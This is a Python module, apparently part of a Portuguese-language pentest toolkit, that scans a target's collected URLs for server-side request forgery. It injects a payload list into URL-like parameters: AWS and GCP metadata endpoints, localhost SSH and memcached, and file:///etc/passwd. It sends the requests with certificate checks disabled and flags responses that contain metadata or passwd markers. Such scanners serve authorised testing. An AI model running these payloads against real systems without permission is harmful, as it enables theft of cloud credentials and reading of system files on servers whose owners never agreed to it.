#!/usr/bin/env python3
"""
SSRF Detector — Detecta potenciais vulnerabilidades de Server-Side Request Forgery.
"""
import requests
from urllib.parse import urlparse, parse_qsl, urlunparse, urlencode
from pathlib import Path

from menu import C
from ..output import info, success, warn, error

# Payload de teste (ex: Interacting with metadata service)
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/computeMetadata/v1/", # GCP metadata
    "http://metadata.google.internal/",          # Google Cloud
    "http://127.0.0.1:22",                       # SSH local
    "http://localhost:80",                       # HTTP local
    "file:///etc/passwd",                        # LFI/SSRF
    "dict://127.0.0.1:11211/",                   # Memcached
    "http://[::]:80/",                           # IPv6 Local
]

def ensure_outdir(target: str) -> Path:
    outdir = Path("output") / target / "ssrf"
    outdir.mkdir(parents=True, exist_ok=True)
    return outdir

def scan_ssrf(urls: list) -> list:
    """Detecta vulnerabilidades SSRF baseadas em tempo ou resposta."""
    findings = []
    
    # Parâmetros comuns que indicam SSRF
    ssrf_params = {'url', 'uri', 'dest', 'destination', 'path', 'api', 'link', 'u', 'request', 'proxy', 'data', 'feed', 'val', 'image_url', 'file'}

    for url in urls:
        try:
            parsed = urlparse(url)
            if not parsed.query:
                continue
                
            params = dict(parse_qsl(parsed.query))
            for param in params:
                if any(x in param.lower() for x in ssrf_params):
                    for payload in SSRF_PAYLOADS:
                        # Criar nova URL com o payload
                        new_params = params.copy()
                        new_params[param] = payload
                        
                        new_query = urlencode(new_params)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                        
                        try:
                            # Testar se a resposta muda significativamente ou se há timing out
                            resp = requests.get(test_url, verify=False, timeout=5, allow_redirects=True)
                            
                            # Indicadores de SSRF:
                            # 1. Conteúdo de metadados cloud na resposta
                            indicadores = ["ami-id", "instance-id", "computeMetadata", "root:x:0:0"]
                            if any(ind in resp.text for ind in indicadores):
                                warn(f"   🚩 [SSRF CONFIRMED] {C.RED}{url}{C.END} (Param: {param}, Payload: {payload})")
                                findings.append({
                                    "url": url,
                                    "param": param,
                                    "payload": payload,
                                    "type": "CONFIRMED",
                                    "severity": "CRITICAL"
                                })
                                break
                                
                            # 2. Mudança de status code ou comportamento suspeito (heurística básica)
                            if resp.status_code == 200 and len(resp.text) > 0:
                                # Poderia ser um falso positivo, mas vale investigar
                                pass
                                
                        except requests.exceptions.Timeout:
                            # Timing out pode ser sinal de que o servidor tentou conectar internamente
                            warn(f"   🟡 [SSRF POTENTIAL - TIMEOUT] {C.YELLOW}{url}{C.END} (Param: {param}, Payload: {payload})")
                            findings.append({
                                "url": url,
                                "param": param,
                                "payload": payload,
                                "type": "TIMEOUT",
                                "severity": "MEDIUM"
                            })
                        except:
                            continue
        except Exception:
            continue
            
    return findings

def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")
        
    info(
        f"\n⚡───────────────────────────────────────────────────────────⚡\n"
        f"   📡 {C.BOLD}{C.CYAN}INICIANDO MÓDULO: SSRF DETECTOR{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"⚡───────────────────────────────────────────────────────────⚡\n"
    )
    
    # 1. Carregar URLs
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        warn("⚠️ Arquivo de URLs não encontrado.")
        return []
        
    urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    
    # 2. Executar Scan
    findings = scan_ssrf(urls)
    
    # 3. Salvar Resultados
    outdir = ensure_outdir(target)
    out_file = outdir / "findings.json"
    
    import json
    with open(out_file, "w") as f:
        json.dump(findings, f, indent=4)
        
    if findings:
        success(f"\n   ✔ {len(findings)} áreas suspeitas de SSRF detectadas!")
    else:
        info("\n   ✔ Nenhum SSRF óbvio detectado.")
        
    return findings
